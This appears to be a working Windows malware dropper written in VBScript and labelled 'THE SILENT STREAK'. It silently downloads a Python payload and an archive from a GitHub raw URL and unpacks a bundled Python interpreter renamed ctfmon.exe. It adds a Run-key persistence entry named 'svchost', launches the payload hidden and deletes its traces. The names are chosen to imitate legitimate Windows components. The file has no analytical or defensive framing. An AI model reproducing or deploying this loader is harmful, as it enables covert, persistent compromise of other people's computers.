' --- THE SILENT STREAK (V16.2 - VBS MASTER) ---
On Error Resume Next

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set http = CreateObject("MSXML2.XMLHTTP")
Set stream = CreateObject("Adodb.Stream")

ID = "svchost"
' We'll land in SystemStorage to stay consistent
Path = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Documents\SystemStorage"
If Not fso.FolderExists(Path) Then fso.CreateFolder(Path)

' 1. LANDING THE ENGINE
C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
http.Open "GET", C_URL, False
http.Send
If http.Status = 200 Then
    stream.Open
    stream.Type = 1
    stream.Write http.ResponseBody
    stream.SaveToFile Path & "\WinServices.py", 2
    stream.Close
End If

' 2. LANDING THE CORE (The Zip)
Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/mui_cache.bin"
http.Open "GET", Z_URL, False
http.Send
If http.Status = 200 Then
    stream.Open
    stream.Type = 1
    stream.Write http.ResponseBody
    stream.SaveToFile Path & "\mui_cache.zip", 2
    stream.Close
End If

' 3. EXTRACTION (Direct Shell Unzip)
Set objShell = CreateObject("Shell.Application")
Set objSource = objShell.NameSpace(Path & "\mui_cache.zip")
Set objDest = objShell.NameSpace(Path)
' 16 = Respond "Yes to All", 4 = No Progress Bar
objDest.CopyHere objSource.Items(), 16 + 4

' 4. PERSISTENCE (Registry Run Key)
PY_EXE = Path & "\python\ctfmon.exe"
PY_SCRIPT = Path & "\WinServices.py"
RegKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" & ID
shell.RegWrite RegKey, """" & PY_EXE & """ """ & PY_SCRIPT & """", "REG_SZ"

' 5. ENGAGE (Run Hidden)
shell.Run """" & PY_EXE & """ """ & PY_SCRIPT & """", 0, False

' 6. CLEANUP
WScript.Sleep 5000 ' Give it a second to finish extraction
fso.DeleteFile(Path & "\mui_cache.zip")
